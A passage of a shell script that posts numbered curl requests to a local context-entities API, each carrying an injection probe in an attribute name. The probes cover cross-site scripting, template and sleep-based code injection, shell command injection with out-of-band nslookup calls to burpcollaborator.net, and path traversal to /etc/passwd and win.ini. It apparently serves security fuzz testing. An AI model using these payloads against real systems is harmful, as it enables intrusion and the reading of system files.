          "value": "1"
        }
      ],
      "name": "confirm%281%29",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 132"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "\u0000confirm(1)",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 133"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "prompt(1)",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 134"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "prompt%281%29",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 135"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "\u0000prompt(1)",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 136"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "document.location=1",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 137"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "document%2elocation%3d1",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 138"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "\u0000document.location=1",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 139"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "document.title=1",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 140"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "document%2etitle%3d1",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 141"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "\u0000document.title=1",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 142"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "arknz<a>zxxer",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 143"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "arknz%3ca%3ezxxer",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 144"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "\u0000arknz<a>zxxer",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 145"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "e94ia1g1r7><",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 146"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "e94ia1g1r7%3e%3c",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 147"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "\u0000e94ia1g1r7><",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 148"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "glhia\${935*769}ythmz",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 149"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "epm2f{{646*582}}fidh6",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 150"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test}}syb0t'\/\"<r2dni",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 151"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test%}tyq6t'\/\"<m7btu",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 152"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testdo74d%>to7jt'\/\"<rofj0",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 153"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test'+sleep(20.to_i)+'",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 154"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test'+eval(compile('for x in range(1):\\n import time\\n time.sleep(20)','a','single'))+'",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 155"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "eval(compile('for x in range(1):\\n import time\\n time.sleep(20)','a','single'))",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 156"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test'.sleep(20).'",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 157"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test{\${sleep(20)}}",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 158"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "6uui6h1qwq\u00c1\u0081izmmbki2xc",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 159"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "6uui6h1qwq\u00c1\u0081izmmbki2xc",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 160"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "m3cbys6qpf%41339nap6l34",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 161"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "m3cbys6qpf%41339nap6l34",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 162"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "ao1wyzglh7\\\\lzilbnab48",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 163"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "ao1wyzglh7\\\\lzilbnab48",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 164"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "ddl63o4oox&#65;wxsk8rpzs9",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 165"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "ddl63o4oox&#65;wxsk8rpzs9",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 166"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testw5iipe3t88\u00c1\u0081lgxga7jb7d",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 167"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testw5iipe3t88\u00c1\u0081lgxga7jb7d",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 168"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testh9rihjy6nl%41ezentauxl7",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 169"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testh9rihjy6nl%41ezentauxl7",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 170"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testiat2s2q2ot\\\\lfte8l7pa2",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 171"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testiat2s2q2ot\\\\lfte8l7pa2",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 172"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testso0c5vyrvc&#65;i0vjkml5bw",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 173"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testso0c5vyrvc&#65;i0vjkml5bw",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 174"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "ixj63bjmnjlmtenq7u96i6il9cf35rvfn3fqaez.burpcollaborator.net",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 175"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "http:\/\/6w3u2ziam7kas2me6i8uhuh980er4fu3krce72w.burpcollaborator.net\/?test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 176"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "nslookup -q=cname ng7bmg2r6o4rcj6vqzsb1b1qshy8owek7nvfia6z.burpcollaborator.net.&",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 177"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test|nslookup -q=cname suqg0lgwktiwqok0446gfgfv6mcd21spodg0bo0.burpcollaborator.net.&",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 178"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test'\"\`0&nslookup -q=cname 3eirkw074427az4bofqrzrz6qxwomcc09o1bwzl.burpcollaborator.net.&\`'",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 179"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test&nslookup -q=cname mxna3fjqnnlqtinu7y9aiaip9gf75vvjq7iudi2.burpcollaborator.net.&'\\\"\`0&nslookup -q=cname mxna3fjqnnlqtinu7y9aiaip9gf75vvjq7iudi2.burpcollaborator.net.&\`'",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 180"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test|echo styr0akqvx aoa6szzu7b||a #' |echo styr0akqvx aoa6szzu7b||a #|\" |echo styr0akqvx aoa6szzu7b||a #",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 181"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test&echo 4n9tf57erx 00cwf9t5zj&",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 182"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test\"|echo ik3c4cuyaw 9mfvuri622 ||",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 183"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test'|echo m2fiez8zlj 3gkw45h2w5 #xzwx",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 184"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 185"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test|ping -c 21 127.0.0.1||x",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 186"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test&ping -n 21 127.0.0.1&",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 187"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test'|ping -c 21 127.0.0.1 #",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 188"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test\"|ping -n 21 127.0.0.1 ||",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 189"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 190"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "c:\\windows\\win.ini",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 191"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 192"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini\u0000test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 193"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 194"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "\/etc\/passwd",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 195"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 196"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd\u0000test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 197"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "...\/test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 198"
